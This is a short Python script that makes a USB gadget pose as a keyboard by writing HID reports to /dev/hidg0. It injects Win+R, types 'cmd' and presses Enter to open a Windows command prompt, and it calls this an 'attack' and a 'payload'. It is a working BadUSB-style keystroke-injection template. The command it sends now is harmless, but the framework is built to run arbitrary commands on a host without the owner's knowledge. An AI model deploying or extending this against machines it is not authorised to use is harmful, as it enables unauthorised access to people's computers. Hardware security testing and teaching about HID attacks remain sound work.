#!/usr/bin/env python3
import time

# Define HID file
HID_DEV = "/dev/hidg0"

# --- Keycodes ---
# A-Z starts at 0x04
# Numbers start at 0x1E
# Enter is 0x28
KEY_R = 0x15
KEY_ENTER = 0x28
MOD_GUI = 0x08  # Windows Key
MOD_NONE = 0x00

# Mapping for "cmd"
# c=0x06, m=0x10, d=0x07
cmd_sequence = [0x06, 0x10, 0x07] 

def send_report(modifier, code):
    # 8-byte report: [Modifier, Reserved, Key, 0, 0, 0, 0, 0]
    with open(HID_DEV, "wb") as f:
        f.write(bytearray([modifier, 0, code, 0, 0, 0, 0, 0]))
    
    time.sleep(0.05) # Computer needs time to register press

    # Release
    with open(HID_DEV, "wb") as f:
        f.write(bytearray([0, 0, 0, 0, 0, 0, 0, 0]))
    
    time.sleep(0.05)

print("Starting attack in 3 seconds...")
time.sleep(3)

# 1. Press Windows + R
print("Sending Win+R...")
send_report(MOD_GUI, KEY_R)

# 2. Wait for Run Dialog to appear
time.sleep(0.5)

# 3. Type "cmd"
print("Typing payload...")
for key in cmd_sequence:
    send_report(MOD_NONE, key)

# 4. Press Enter
print("Launching...")
send_report(MOD_NONE, KEY_ENTER)

print("Done.")